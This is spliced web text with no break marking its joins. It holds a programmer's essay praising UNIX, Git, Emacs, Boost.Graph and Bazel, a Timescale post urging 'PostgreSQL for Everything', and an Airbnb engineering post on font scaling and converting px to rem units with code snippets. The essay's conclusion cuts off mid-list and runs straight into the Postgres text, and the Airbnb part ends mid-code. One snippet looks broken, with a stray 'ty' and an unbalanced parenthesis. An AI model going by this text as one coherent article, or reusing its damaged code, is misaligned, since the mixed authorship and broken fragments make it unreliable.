<p>As programmers, we interact with software tools daily.
Most of them can barely get the job done.
But once in a white, we discover a piece of software that transcends mere utility.
These tools capture our imagination, open new possibilities, and affect how we design our own systems.
I call such software <em>enlightenmentware</em>.</p><p>The most common source of enlightenment for programmers is the programming language they use at work or learn as a hobby.
I experienced many jolts of enlightenment from fiddling with programming languages, from <a href="https://en.wikipedia.org/wiki/Microsoft_Macro_Assembler"><span>masm</span></a> and <a href="https://en.wikipedia.org/wiki/C_(programming_language)">C</a> to <a href="https://en.wikipedia.org/wiki/Prolog">Prolog</a> and <a href="https://www.idris-lang.org/">Idris</a>.
I won’t focus on languages, however, since the effects of language learning on mind expansion is old news<label for="sn-norvig"></label><span>
  See, for example, Peter Norvig’s <q><a href="https://norvig.com/21-days.html">Teach Yourself Programming in Ten Years</a></q>.
</span>.</p><p>In this article, I praise the software that contributed the most to my enlightenment.</p></section><section><h2 id="unix"><a href="#unix">UNIX</a></h2><div><blockquote><p>
  <span>unix</span> is user-friendly—it’s just choosy about who its friends are.
</p></blockquote></div><p>I started looking for my first real programming job around 2008, while studying at university in my hometown of Nizhny Novgorod.
Almost all the open positions required knowledge of mysterious things called <span>unix</span> and <em>sockets</em>.
My curriculum didn’t offer a course on <span>unix</span> or operating systems in general, so I decided to get a textbook and master the topic myself. </p><p><q><a href="https://www.goodreads.com/book/show/22066650-unix">The <span>unix</span> Operating System</a></q> by Andrey Robachevsky et al., also known as the <em>turtle book</em> in Russia because of its cover, introduced me to the magical world of <span>unix</span>-like operating systems.
<span>unix</span> became something I could understand, explore, and programmatically interact with.
All pieces of the puzzle—the filesystem interface, the process model with environments and permissions, forking, sockets, and signals—fell into place and revealed a coherent, beautiful picture.</p><p>A search for a working <span>unix</span> installation led me to <a href="https://en.wikipedia.org/wiki/Mandriva_Linux">Mandriva Linux</a>.
It was like discovering a parallel universe where you don’t have to pirate software or spend forty minutes installing an <span>ide</span> to compile a <span>c</span> program.
Here, people developed software for fun and shared it freely.
I couldn’t fathom why anyone would use Windows<label for="sn-windows"></label><span>
  I became significantly more tolerant since my early university years.
  Windows (specifically the <a href="https://en.wikipedia.org/wiki/Windows_NT">NT family</a>) is a great operating system.
  I even have it installed on my gaming <span>pc</span> so that I can buy games I never play.
</span>.</p><p>From that moment on, <span>unix</span> followed me through all stages of my life:
the toddler phase of keeping up with the cutting-edge <a href="https://ubuntu.com/">Ubuntu</a> releases,
the rebellious teens of compiling custom kernels for my <a href="https://www.thinkwiki.org/wiki/Category:T61p">Thinkpad T61p</a> and <a href="https://wiki.gentoo.org/wiki/Emerge">emerging</a> the <a href="https://wiki.gentoo.org/wiki/World_set_(Portage)"><code>@world</code></a> on <a href="https://www.gentoo.org/">Gentoo</a>,
the maturity of returning to Ubuntu <span>lts</span> and delaying upgrades until the first dot one release,
and to the overwhelmed parent stage of becoming a happy macOS user.</p><p><span>unix</span> also became an essential building block in my profession.
Most of the software I wrote operates in a <span>unix</span> environment, and I still occasionally consult my copy of <a href="https://www.goodreads.com/book/show/603263.Advanced_Programming_in_the_UNIX_Environment">Advanced Programming in the <span>unix</span> Environment</a>.</p></section><section><h2 id="git"><a href="#git">Git</a></h2><div><blockquote><p>
  It is easy to shoot your foot off with git, but also easy to revert to a previous foot and merge it with your current leg.
</p></blockquote></div><p>I encountered version control systems in early 2009; the company I worked for used <a href="https://en.wikipedia.org/wiki/IBM_Rational_ClearCase">Rational ClearCase</a> to manage their code.
The system versioned each file separately and relied on large configuration files—<em>config specs</em>—to construct a consistent snapshot of the source tree.
The tool was utterly confusing and intimidating, so I avoided dealing with it beyond the minimal requirements of my job.</p><p>About a year later, I joined a shop that used <a href="https://subversion.apache.org/">Subversion</a>.
This time, I invested in learning upfront and swallowed the entire <a href="https://svnbook.red-bean.com/">Version Control with Subversion</a> before making my first commit.
Subversion was easy to understand and use; I couldn’t imagine how to improve on it.
Still, I perceived it as a tool that you use at work.
There was enough friction in setting up a repository to hinder its use for small personal projects.
At the time, Google offered hosting on <a href="https://code.google.com/">Google Code</a>, but I didn’t feel comfortable sharing my experiments with the world back then.</p><p>And then I discovered <a href="https://git-scm.com/">Git</a>.</p><p>Git was nothing like Subversion.
It had a steep learning curve and confused everyone to no end<label for="sn-git-random-man"></label><span>
  Way before we all got used to ChatGPT,
  <a href="https://github.com/Lokaltog">Kim Ødegaard</a> created a <a href="https://git-man-page-generator.lokaltog.net/">service</a> that generates random man pages mocking Git’s dense documentation style.
</span>.
Still, the confusion was qualitatively different from what I experienced with ClearCase.
ClearCase is confusing like a Russian novel: All the characters have strange names, the plot is complex, and it doesn’t end well.
Git is confusing like math: It slowly melts your brain and molds it into a <a href="https://en.wikipedia.org/wiki/Tesseract">tesseract</a>, giving access to higher dimensions.</p><p>Git removed the friction from using version control; there was no excuse not to version anything of value anymore.
Merging branches with Git didn’t cause anxiety disorders.
The staging area—confusingly named <em>index</em>—became essential to my workflows.
But my favorite feature was the breathtaking beauty of Git’s design, the elegant mix of distributed systems, acyclic graphs, and content-addressed storage.</p><p>Learning about Git’s internals was so much fun that I became interested in the bits and bolts of other version control systems.
I travelled through time from <a href="https://darcs.net/">Darcs</a> to <a href="https://www.mercurial-scm.org/">Mercurial</a>, <a href="https://www.bitkeeper.org/">BitKeeper</a>, and the ultimate origin, <a href="https://en.wikipedia.org/wiki/Source_Code_Control_System">SCCS</a>.
I also built a toy one-file version control system while learning Rust.</p><p>Will Git ever be replaced with something better?
Just as it was hard to imagine an improvement over Subversion before Git came along, it’s hard to imagine a significant improvement over Git now.
For me, Git’s primary disadvantage is its snapshot-oriented approach that makes merges hard to reason about.
Git, Mercurial, and most other tools make it challenging to separate original code from the decisions that the person merging files had to make<label for="sn-janestreet-patch-vs-diff"></label><span>
  Jane Street’s tech staff reports similar concerns.
  See, for example, the <a href="https://blog.janestreet.com/patch-review-vs-diff-review-revisited/">Patch review vs. diff review, revisited</a> blog article.
</span>.
Systems based on <a href="https://en.m.wikibooks.org/wiki/Understanding_Darcs/Patch_theory">patch theory</a>, such as <a href="https://pijul.org/">Pijul</a> and <a href="https://darcs.net/">Darcs</a>, might address these issues.</p></section><section><h2 id="emacs"><a href="#emacs">Emacs</a></h2><div><blockquote><p>
  While any text editor can save your files, only Emacs can save your soul.
</p></blockquote></div><p>I edited my first programs in a friendly blue window of <a href="https://en.wikipedia.org/wiki/Turbo_Pascal">Turbo Pascal 7.0</a>.
The environment had little friction: no project or build configuration, no noticeable build time; you type your code and run it.
That was a perfect tool for learning.</p><p>My university used Pascal for introductory programming classes, so I also used Turbo Pascal for my assignments.
Later courses introduced C++ and Java, for which we used <a href="https://en.wikipedia.org/wiki/Visual_Studio#6.0_(1998)">Visual Studio 6.0</a> and <a href="https://en.wikipedia.org/wiki/JBuilder">JBuilder</a>.
Although we learned to invoke compilers from the command line, <span>ide</span>s dominated my early code-editing experience.</p><p>At my first programming job, I worked on a remote Solaris workstation over a <a href="https://en.wikipedia.org/wiki/Citrix_Systems">Citrix</a> connection.
Almost everyone in our group used <a href="https://en.wikipedia.org/wiki/NEdit">NEdit</a> to edit the code.
One day, I noticed a person whose editor looked markedly different from everyone else’s; the background was dark, and the code glowed with bright colors.
To me, that was a sign of their superior technical knowledge.
I <em>needed</em> to learn how to tweak my editor.</p><p>The quest for customization led me to <a href="https://www.vim.org/">Vim</a> (the workstation had Vim 6 installed out of the box).
After all, if the goal is to stand out from the crowd, why stop at the color scheme?
I went through the Vim tutorial, and it clicked with me immediately.
It felt like playing a musical instrument: challenging but fun.
It turned a mundane job of fixing bugs into an exercise in skill.</p><p>I don’t remember exactly when and why I got interested in Emacs<label for="sn-wolfram-notes"></label><span>
  Daly journaling is one of the things I wish I started doing earlier.
  I’m nowhere near <a href="https://writings.stephenwolfram.com/2019/02/seeking-the-productive-life-some-details-of-my-personal-infrastructure/#archiving-and-searching">Stephen Wolfram’s level</a>, but I enjoy going back and seeing what I was up to a few years ago.
</span>.
Most likely, it was a result of my obsession with Lisp after reading <a href="https://en.wikipedia.org/wiki/Structure_and_Interpretation_of_Computer_Programs">Structure and Interpretation of Computer Programs</a> and looking for a Lisp to interact with.
I remember reading <a href="https://www.gnu.org/software/emacs/manual/eintr.html">An Introduction to Programming in Emacs Lisp</a> around 2010 and having a great time.</p><p>I became interested in the editor internals.
Using <a href="https://www.finseth.com/craft/">The Craft of Text Editing</a> by Craig A. Finseth as a guide, I explored the source code of various editors to see how they worked: which the data structures they used to represent text buffers, how they interacted with extensions and implemented the undo mechanism.
I found Vim’s source code somewhat messy, inconsistent, and hard to understand.
Emacs’s source was spotless, well-organized, and well-documented.</p><p>A dive into Emacs internals also revealed the inherent beauty of its architecture.
Emacs is a Lisp machine that provides text editing and window management capabilities.
It is a powerful, convenient, and friendly development environment for building dynamic text-driven applications in Emacs Lisp.</p><p>Almost everything in Emacs is a Lisp object you can inspect, interact with, and access its documentation.
That makes Emacs’ documentation system unparalleled once you master it.
Emacs’ dynamism makes extending it much easier than any other editor.
The feedback loop is airtight: you can immediately try out your code in the context of the editor you use to write it.</p><p>Although I’m writing these words in <a href="https://code.visualstudio.com/">Visual Studio Code</a>, I always have my Emacs open<label for="sn-vim"></label><span>
  I also have a <a href="https://github.com/tmux/tmux/wiki">tmux</a> session with multiple <a href="https://neovim.io/">nvim</a> instances running.
  I use these when my pinky gets tired of holding down the <kbd>Ctrl</kbd> key.
</span>.
Many things are easier in Emacs; I don’t think any software will ever completely replace it for me.
It’s also my editor of choice if I need to implement an extension.
Programming Emacs Lisp is a joy, especially compared to writing Vimscript.</p></section><section><h2 id="boost-graph"><a href="#boost-graph">Boost.Graph</a></h2><div><blockquote><p>
  I also must confess to a strong bias against the fashion for reusable code.
  To me, <q>re-editable code</q> is much, much better than an untouchable black box or toolkit.
</p></blockquote></div><p>The evening of 2013 New Year’s Eve didn’t go as planned.
I was on a cruise ship crossing the stormy Baltic Sea and couldn’t stay on my feet because of the seasickness.
Instead of consuming tasty treats with the rest of the passengers, I was lying in bed and reading a book I took for the trip: <a href="https://www.goodreads.com/book/show/1705806.The_Boost_Graph_Library">The Boost Graph Library</a> by Jeremy G. Siek et al.</p><p>Most algorithm libraries require you to commit to a specific data representation, making integrating them into an existing project prohibitively expensive.
That’s especially true for graph algorithms: The vertices and edges are usually implicitly defined and deeply embedded into other data structures, so it’s easier to re-implement the algorithm than to use a generic library.</p><p>The <a href="https://www.boost.io/libraries/graph/">Boost.Graph</a> library solves this problem elegantly using <a href="https://en.wikipedia.org/wiki/Alexander_Stepanov">Alex Stepanov</a>’s ideas on generic programming.
It uses a bag of tricks (type traits, property maps, visitors) to implement graph algorithms that can work with any graph representation you throw at them, given that you provide an adapter telling the library how to view your data structures as a graph.</p><p>Even though I never had a chance to use the library in practice<label for="sn-boost-graph-use"></label><span>
  Given that I share Donald Knuth’s attitude opening this section, I would probably not use the library even if I had a chance.
  I’d rather write one page of interesting code traversing a graph than two pages of boring adapters required to invoke the algorithm.
</span>, its design helped me deepen my understanding of <a href="https://en.wikipedia.org/wiki/Standard_Template_Library"><span>stl</span></a> design and generic programming in general.
It also helped me understand the motivation for advanced type-level programming features in other programming languages, such as <a href="https://wiki.haskell.org/GHC/Type_families">type families</a> in Haskell.
Overall, Boost.Graph is one of the most enlightening pieces of software that I’ve never used.</p></section><section><h2 id="bazel"><a href="#bazel">Bazel</a></h2><div><blockquote><p>
  If make doesn’t do what you expect it to, it’s a good chance the makefile is wrong.
</p></blockquote></div><p>I wrote my first <code>Makefile</code> around 2009 while working on a research project in computational mathematics for my degree.
I already used <a href="https://en.wikipedia.org/wiki/Make_(software)"><code>make</code></a> at work, but I didn’t need to understand how it worked.
This time, I had to compile a <span>fortran</span> program mixing sources adhering to different language standards: from venerable <span>fortran</span> 77 to hip Fortran 2003.
To get a deeper understanding of the tool, I referred to <a href="https://www.oreilly.com/library/view/managing-projects-with/0596006101/">Managing Projects with GNU Make</a> by Robert Mecklenburg.</p><p>Most books on technology excite me: I become enthusiastic about the subject and want to try it out in practice. 
The book on <code>make</code> had the opposite effect.
The complexity required to make builds correct and ergonomic made me earn for a better tool<label for="sn-modern-cpp-design"></label><span>
  One book that made me feel the same way was <a href="https://www.goodreads.com/book/show/871669.Modern_C_Design">Modern C++ Design</a> by Andrei Alexandrescu.
  The book is deep and beautifully written, but the terrifyingly clever and ugly tricks in the second chapter made me question the choice of the programming language.
  Another one is <a href="https://nostarch.com/autotools2e">Autotools</a> by John Calcote.
</span>.</p><p>After my deep dive into <code>make</code>, I often fiddled with build systems at work:
I introduced <a href="https://cmake.org/">CMake</a> to my first C++ project to replace complex and scarily incorrect <code>Makefile</code> files and
replaced an inflexible <a href="https://ant.apache.org/">Ant</a>-based build system in a 500 <span>kloc</span> Java project with <a href="https://gradle.org/">Gradle</a> scripts that everyone on the team could contribute to.
But all of the tools I tried, including <a href="https://cmake.org/">CMake</a>, <a href="https://ant.apache.org/">Ant</a>, <a href="https://maven.apache.org/">Maven</a>, <a href="https://gradle.org/">Gradle</a>, <a href="https://www.scons.org/">SCons</a>, and <a href="https://www.gnu.org/software/automake/manual/html_node/Autotools-Introduction.html">autotools</a> left me deeply unsatisfied.
They were clanky, awkward, and hard to extend and compose.</p><p>In 2016, I joined Google in Zurich.
I heard about Google’s internal build tool, <code>blaze</code>, and couldn’t wait to lay my hands on it.
Surprisingly, I didn’t need to fiddle with <code>blaze</code>, nor did I have to understand how it worked.
I could copy some build targets and edit the dependency list, and the build worked as expected.
<code>blaze</code> made correct and fast builds not just easy, but <em>boring</em> in the good sense.
Only a few years later, when I attempted to use <a href="https://bazel.build/">Bazel</a>—the open-source version of <code>blaze</code>—for a toy personal project, did I have to understand the underlying model.</p><p>Bazel was the final piece of the puzzle, together with Haskell’s typeclasses, <a href="https://research.google/pubs/flumejava-easy-efficient-data-parallel-pipelines/">Flume pipelines</a> interface,  and the <a href="https://www.tensorflow.org/">TensorFlow</a> 1.0 execution model, that made me understand the ubiquitous plan-execute pattern<label for="sn-build-systems-a-la-carte"></label><span>
  The <a href="https://www.microsoft.com/en-us/research/uploads/prod/2018/03/build-systems.pdf">Build Systems à la Carte</a> article by Andrey Mokhov, Neil Mitchell, and Simon Peyton Jones explains how various build system designs map to Haskell typeclasses.
  Thomas Leonard’s <a href="https://roscidus.com/blog/blog/2019/11/14/cicd-pipelines">CI/CD pipelines: Monad, Arrow or Dart?</a> blog post is also a great read on this topic.
</span>.
Bazel build file is a program that constructs a slice of the build artifact graph.
Bazel rules don’t <em>run</em> the build commands; they <em>declare</em> how to transform inputs into outputs, and the Bazel engine figures out the rest.</p><p>My relationship with the tool reached true intimacy when I helped <a href="https://mmapped.blog/posts/17-scaling-rust-builds-with-bazel">transition <span>dfinity</span>’s build system to Bazel</a>.
Despite all the challenges I faced on the way, Bazel is still my favorite build system.
It’s fast, correct, easy to use, and language-agnostic.</p><p>Paraphrasing <a href="https://www.stroustrup.com/quotes.html">Bjarne Stroustup</a>, I think a smaller, simpler, cleaner build system is struggling to get out within Bazel.
I hope this core will someday reveal itself to the world and become the standard tool for building all software.</p></section><section><h2 id="conclusion"><a href="#conclusion">Conclusion</a></h2><p>After presenting my cases, I find it tempting to look for a common theme.
What makes a good enlightenmentware?
For me, these are the key points:</p><ul>
  <li>
  All these tools address a deep problem, and a kind of problem that I face every day, such as making programs on my computer cooperate, managing concurrent work streams, or generalizing a piece of code.
  </li><li>
  They are <q>round</q>: they pack the most volume in the smallest surface area.
  <span>unix</span> surface area is tiny, but it unlocks much power.
  Emacs and Git are all over the place, but their <em>core</em> is small, sweet, and easy to appreciate.
  </li><li>
  They invite and encourage you to explore their internals.
  It’s not only about being free and open-source; mastering them is also well worth the investment.

So, you might end up adopting various existing databases: Postgres for transactional data, Elastic for full-text search, Influx for time series, Pinecone for vector operations, and maybe ClickHouse for analytics. Suddenly, your tech stack is sprawling.</p>

<h2 id="why-stack-sprawl-is-a-problem">Why Stack Sprawl Is a Problem</h2><p>Each new database you add brings its own set of challenges: different languages to learn, consistency models to understand, and operational nuances that can’t be ignored. Not only does this add complexity, but it also introduces what I call “dotted line” complexity, the additional overhead that comes from each pair of systems which data flows between. The more databases and the more dotted lines you have, the harder it is to reason about the state of your system as a whole.</p><p>You’ve got more databases, and because of that, you’ve got more problems.</p><figure><img src="https://www.timescale.com/blog/content/images/2024/05/Postgres-for-Everything_Biggie.gif" alt="A Biggie gif: mo' databases, mo' problems" loading="lazy" width="512" height="512"></figure><h2 id="the-case-for-collapsing-your-stack">The Case for Collapsing Your Stack</h2><p>So what’s the alternative? In my mind, it’s collapsing your stack. If you solve more problems with one database, you’re removing multiple complex pieces of software and the dotted line complexity between them. It’s much easier to keep a mental model of your data flow in your head, as well as reason about the consistency of data at different times. You get time back, which would have been spent on operating these new databases, and you can spend that time building features.</p><figure><img src="https://www.timescale.com/blog/content/images/2024/05/Collapse-your-stack-postgres-for-eveything-3.png" alt="Several problems leading to a single Postgres solution" loading="lazy" width="1200" height="701" srcset="https://www.timescale.com/blog/content/images/size/w600/2024/05/Collapse-your-stack-postgres-for-eveything-3.png 600w, https://www.timescale.com/blog/content/images/size/w1000/2024/05/Collapse-your-stack-postgres-for-eveything-3.png 1000w, https://www.timescale.com/blog/content/images/2024/05/Collapse-your-stack-postgres-for-eveything-3.png 1200w" sizes="(min-width: 720px) 720px"></figure><p>PostgreSQL excels at stack collapsing because it’s simultaneously general-purpose and specialized. As well as being an amazing relational database, it supports a wide range of extra use cases through its advanced extension framework. PostgreSQL can easily handle workloads like <a href="https://www.postgresql.org/docs/current/textsearch-intro.html?ref=timescale.com"><u>full-text search</u></a>, <a href="https://www.timescale.com/?ref=timescale.com"><u>time-series data,</u></a> <a href="https://github.com/pgvector/pgvector?ref=timescale.com"><u>vectors for AI</u></a>, and analytics.&nbsp;</p><p>PostgreSQL isn’t just versatile, it's also robust and mature. People have been running PostgreSQL in production for over 20 years, and with adoption speeding up, PostgreSQL shows no sign of slowing down. Edge cases are well known, deployment patterns, recovery strategies, and high availability are well defined, and there are many, many companies and champions who can help you along the way.</p><p>Because of this, I encourage you to use PostgreSQL to solve as many problems as you can, collapsing your stack, reducing your complexity, and giving you time back to focus on building.</p><p>There’s a well-known argument that you should pick the "best tool for the job," which sometimes gets turned on its head as, “If you’ve only got a hammer, everything looks like a nail.” I don’t see the principle of "PostgreSQL for Everything" contradicting these, as long as you make sure you look at the big picture.</p><p>How do you define "The Best Database for the Job"? Is it the fastest? The easiest to use? The most fault-tolerant? Or is it the one that integrates most seamlessly into your existing infrastructure and you know how to use—perhaps one that’s already in place? The best choice usually falls somewhere in between these criteria.</p><figure><img src="https://www.timescale.com/blog/content/images/2024/05/collapse-your-stack-postgres-for-everything-4.png" alt="The phrase: &quot;Let's just attach x to y and send the data to z.&quot; by someone who has no experience supporting x, y, or z.

If good old PostgreSQL does what you need now—with battle-tested effectiveness—and can scale further (perhaps up to 10x your current needs), then I think you should start with the known quantity. Only consider adding other databases when PostgreSQL lacks critical features, weighing the benefits against the added complexity of managing multiple systems. Or, to put it in a slightly different way, <a href="https://mcfunley.com/choose-boring-technology?ref=timescale.com"><u>Choose Boring Technology</u></a> (sorry Postgres, I promise I still think you’re exciting).</p><p>Let’s consider two possible scenarios:</p><ol><li><strong>PostgreSQL for Everything works</strong>: After years, your workload outgrows the original system capabilities. PostgreSQL struggles in some areas, but this is a “good problem”—a sign of success and a cue to evolve your architecture.</li><li><strong>Overengineered with multiple databases</strong>: You're set up to handle immense scale, but the system is fragile, full of edge cases, and difficult to maintain. This isn't just challenging; it's a threat to your operation's stability.</li></ol><p>Given these scenarios, I’d argue that the theoretical future challenges of a PostgreSQL-centric system are preferable to today’s complexities of opting into a multi-database architecture too early.&nbsp;</p><h2 id="a-final-word">A Final Word</h2><p>"PostgreSQL for Everything" isn't about never using other databases. Honestly, it’s not even about using PostgreSQL for everything. It's a maxim against overengineering your solutions prematurely and an advocate for the benefits of simplicity. Just remember, there are a lot of companies and applications in the world, and with the help of companies like Timescale, PostgreSQL will scale to meet most of their demands.&nbsp;</p><p>If you want to expand your PostgreSQL database, try Timescale. <a href="https://console.cloud.timescale.com/signup?ref=timescale.com" rel="noreferrer">Create a free account today</a> and start simplifying your data stack.</p>

One area that often leads to accessibility issues is <a href="https://www.w3.org/WAI/WCAG21/Understanding/resize-text.html" rel="noopener ugc nofollow" target="_blank">WCAG 1.4.4 Resize Text (Level AA)</a>. This guideline, which we’ll refer to as Resize Text, is particularly beneficial for people with low vision, whether correctable or not (for example with glasses or prescription contacts). The standard specifies that web content and functionality must be maintained when text is scaled 200% (2x) of its original size. Ensuring our site meets this guideline is an important part of our ongoing work to enhance accessibility for all of our users.</p><p id="9c3c">In this blog post, we’ll explore our investigation into the importance of this guideline, how we analyzed our site issues, the technical benefits for using rem units, how we decided on an approach, the cross-browser support issues we encountered, and the benefits we saw in reducing the number of reported issues for Resize Text.</p><h2 id="cded">Meeting the Needs of Users with Vision Difficulties</h2><blockquote><p id="3819"><strong>“90 million Americans over 40 have vision and eye problems. That’s more than 3 in 5.”</strong></p></blockquote><p id="a309"><a href="https://www.cdc.gov/visionhealth/resources/infographics/future.html" rel="noopener ugc nofollow" target="_blank"><em>Looking Ahead: Improving Our Vision for the Future” CDC</em></a></p><p id="a5f1">To illustrate, consider how the Airbnb homepage might appear to someone who has experienced a significant loss of visual acuity. As shown below, the text becomes extremely impossible to read comfortably.</p></div><div><h2 id="da8c">Browser Zoom</h2><p id="0e15">To better understand the accessibility challenge, let us explore how browser zoom functionality works. You may already be familiar with this feature, using keyboard shortcuts like Command / Ctrl + or Command / Ctrl — to scale all content within a window. When you increase the zoom level beyond 100%, the viewport’s height and width proportionally decrease, while the content is blown up to fit the larger window.</p><p id="fb4a">As part of our accessibility testing strategy, we were using browser zoom to test the usability of our pages both on desktop and mobile sizes. Desktop testing showed that our pages did relatively well at the 200% zoom level with our responsive web approach across the site. We saw fewer issues in the overall user experience when compared to mobile web.</p><p id="40ad">This works well on desktop, where we serve a smaller breakpoint (e.g., wide to compact) and the viewport is relatively spacious. However, the limitations of browser zoom become more pronounced on mobile web, where the viewport is smaller. If we were to scale the content in a mobile viewport, it would have to fit into a viewport that is half the width and half the height of the original. This can result in significant accessibility issues, as the text and UI elements become extremely difficult to read and interact with. As shown in the image on the right, the ability to view even a single listing within a screen’s worth of space is not possible without scrolling, leading to a frustrating experience.</p><figure><figcaption><em>Airbnb’s homepage shown at browser zoom 100% on the left, and the same screen shown at 200% showing the search and categories are cut off entirely and not able to even see the first listing.</em></figcaption></figure><h2 id="acb6">Font Scaling</h2><p id="e8ad">Font scaling is the term we’ll use to describe the ability to adjust text size independently of overall page zoom. Unlike browser zoom, which scales all content proportionally, Font Scaling applies only to the text elements on the page. This allows users to customize the font size to their preferred reading size without affecting much of layout or responsiveness of the rest of the content.</p><p id="3b00">Font Scaling, is also the term we will use for scaling the font based on a user’s preferred size. Unlike zoom, this setting will be applied to all sites. Below is an example of how the font scaling applies to just the text on the screen, showing that the only scale of the text increases, instead of all the content.</p><figure></figure><p id="69aa">Video Description:<em> Airbnb text is scaled by setting the font size on arc browser, showing the scaling from 16px to 32xp.</em></p><p id="fc49">This concept of independent font scaling is similar to the Dynamic Type feature on iOS, as we discussed in our blog post <a href="https://medium.com/airbnb-engineering/tagged/dynamic-type" rel="noopener">“Supporting Dynamic Type at Airbnb”</a>. Dynamic Type allows users to set a preferred system-wide text size, which then automatically adjusts the font size across all compatible apps.</p><p id="5e25">Considering our existing strategies for accessibility on iOS, incorporating font scaling (vs zoom scaling) into our web accessibility approach was a natural next step to help add parity in approaches across our platforms.</p><h2 id="16c7">Understanding px, em vs rem</h2><p id="553f">Now that we understand why font scaling is so powerful for mobile web, we should focus on why we might choose one CSS length unit over another for supporting font scaling. In this blog post we are only going to focus on px, em and rem but there are other units as well. CSS length units are connected to font scaling because they determine how text and other elements are sized on a web page. Some length units are fixed, meaning they don’t change based on the user’s font size settings, while others are relative, meaning they scale proportionally with the font size.</p><p id="8b19">Let’s take a deep look at 3 CSS length units and how they relate to font scaling:</p><ul><li id="d527">px units are the most commonly used on the web, theoretically they should represent one pixel on the screen. They are a fixed unit meaning the rendered value does not change.</li><li id="23e9">em units however are a relative unit that are based on the parent element’s font size. The name ‘em’ comes from the width of the capital letter ‘M’ in a given typeface, which was traditionally used as the reference point for font sizes. 1 em unit is equal to the height of the current font size, roughly 16px at the default value. em units scale proportionally, so they can be affected by their parent’s font sizes</li><li id="5320">rem units, short for “root em”, are similar to em units in that they are proportional to font size, but they only use the root element (the html element) to calculate their font size. This means that rem units offer font scaling, but are not affected by their parent’s font size.</li></ul><p id="dedd">The choice between em and rem units often comes down to the level of control and predictability required for font scaling. While em units can be used, they can lead to cascading font size changes that may be difficult to manage, especially in complex layouts. In contrast, rem units provide a more consistent and predictable approach to font scaling, as they are always relative to the root element’s font size.</p><p id="84a6">This is illustrated in the CodePen example, where the different font scaling behaviors of px, em, and rem units are demonstrated. In situations where font scaling is a critical requirement, such as the Airbnb example mentioned, the use of rem units can be a more reliable choice to ensure a consistent and maintainable font scaling solution.</p><figure></figure><p id="21aa">Relative units like rem can be used anywhere a fixed unit like px can be used. However, indiscriminate use of rem units across all properties can lead to unwanted scaling behavior and increased complexity.</p><p id="9e4c">In the case of Airbnb, the team decided to prioritize the use of rem units specifically for font scaling, rather than scaling all elements proportionally. This targeted approach provided the key benefit of consistent text scaling, without the potential downsides of scaling every aspect of the layout.</p><p id="4981">The rationale behind this decision was twofold:</p><ol><li id="54e3">Scaling <em>everything</em> using rem units would have been similar to Browser Zoom and potentially introduced unintended layout issues,</li><li id="8316">The primary focus was on providing a mobile-friendly font scaling solution. By targeting font sizes with rem units, the team could ensure that the most important content — the text — scaled appropriately.</li></ol><h2 id="ff20">Enabling a Seamless Transition for Designers and Developers</h2><p id="2724">Moving from pixel-based values to rem units as a company-wide change in CSS practice can be a significant challenge, especially when working across multiple teams. The time and effort required to educate designers and frontend developers on the new approach, and to have them convert their existing pixel-based values to rem units, can be a significant barrier to adoption. To address this, the Airbnb team decided to focus on automating the unit conversion process as much as possible, enabling a more seamless transition to the new rem-based system.</p><h2 id="18c6">Reducing Friction in Design Iterations</h2><p id="d9b0">Instead of requiring designers to have to think of new units or introduce some conversion for web only, we decided to continue to author our CSS in px units. This reduced the amount of training required for teams to start using rem units out the gate.</p><p id="f0dd">One area we did focus on with our design teams was starting to test their designs using font scaling by leveraging the <a href="https://www.figma.com/community/plugin/892114953056389734/text-resizer-accessibility-checker" rel="noopener ugc nofollow" target="_blank">Text Resizer — Accessibility Checker</a> to help simulate what a design might look like at 2X the font size. This tool helped us spot problems earlier into the design process.</p><h2 id="f7eb">Addressing the Complexity of Two CSS-in-JS Systems</h2><p id="f837">Airbnb is in the process of transitioning from <a href="https://github.com/airbnb/react-with-styles" rel="noopener ugc nofollow" target="_blank">React-with-Styles</a> to a newer approach using <a href="https://linaria.dev/" rel="noopener ugc nofollow" target="_blank">Linaria</a>. While the adoption of Linaria was progressing quickly, we recognized the need to support both styling systems for a consistent experience. Managing the conversion across these two different CSS-in-JS systems posed an additional challenge.</p><h2 id="754f">Linaria</h2><p id="bcb1">By leveraging Linaria’s support for CSS custom properties, the team was able to create new typography theme values that automatically converted the existing pixel-based values to their rem equivalents. This approach allowed the team to introduce the new rem-based theme values in a centralized manner, making them available to child elements. This gave the team the ability to override the rem values on a per-page basis, providing the necessary flexibility during the transition process.</p><pre><span id="658e">import { typography } from './site-theme';<p>// Loops through the CSS Vars we use for typography and converts them<br>// from px to rem units.<br>const theme: css`<br> ${getCssVariables({ typography: replacePxWithREMs(typography) })}<br> // Changes from:<br> // - body-font-size: 16px;<br> // To<br>// - body-font-size: 1rem; <br>`;<br>// Use the class name generated from linaria to override the theme <br>// variables for the children of this component.<br>const RemThemeLocalProvider: React.FC = ({ children }) =&gt; {<br> const cx = useCx();<br> return &lt;div className={linariaClassNames.theme)}&gt;{children}&lt;/div&gt;;<br>};ty</p></span></pre><p id="4868">Although this approach helped us convert most of the font scaling properties, there were many places in our code that we used pxbased values outside the theme. Linaria’s support for post-CSS plugins made solving these areas relatively easy. We leveraged <a href="https://github.com/cuth/postcss-pxtorem#readme" rel="noopener ugc nofollow" target="_blank">postcss-pxtorem</a> to help target those values more easily. We started by using an allow list, so that we could carefully apply this change to a smaller set of early adopting pages.</p><p id="6fd1">It was important that we provided an escape hatch when there was some reason for front-end engineers needing to use px units. Luckily we were able to provide this by using a different casing for the px value like shown below.</p><pre><span id="b9c0">/* `px` is converted to `rem` */<br>.convert {<br>  font-size: 16px; /* converted to 1rem */<br>}<br>/* `Px` or `PX` is ignored by `postcss-pxtorem` <br>   but still accepted by browsers */<br>.ignore {<br>  font-size: 200Px;<br>  font-size: clamp(16Px, 2rem, 32Px);<br>}</span></pre><h2 id="1e0d">React with Styles</h2><p id="feb2">A good amount of our frontend code still uses react-with-styles, so we had to find another way to support these cases with an easy conversion. Through this we created a simple Higher-Order component that made the conversion pretty straightforward. First we created a wrapper for the withStyles function like below, and gave the ability to avoid conversion as well.</p><pre><span id="9ba1">export const withRemStyles = (<br>  styleFn?: Nullable&lt;(theme: Theme) =&gt; Styles&gt;,<br>  options?: WithStylesOptions &amp; { disableConvertToRemUnits?: boolean },<br>) =&gt; {<br>  const disableConvertToRemUnits = getDisableConvertToRemUnits(options);<br>   // If conversion is disabled, just return the original withStyles function<br>   if (disableConvertToRemUnits) {<br>     return _withStyles(styleFn, options);<br>    }<br>   // Otherwise, wrap the original style function with a new function <br>   // that converts px to rem<br>   return _withStyles((theme: Theme) =&gt; {<br>     if (styleFn) {<br>     const styles = styleFn(theme);<br>     const remStyles = convertToRem(styles);<br>     return remStyles;<br>   }<br>   return {};<br> }, 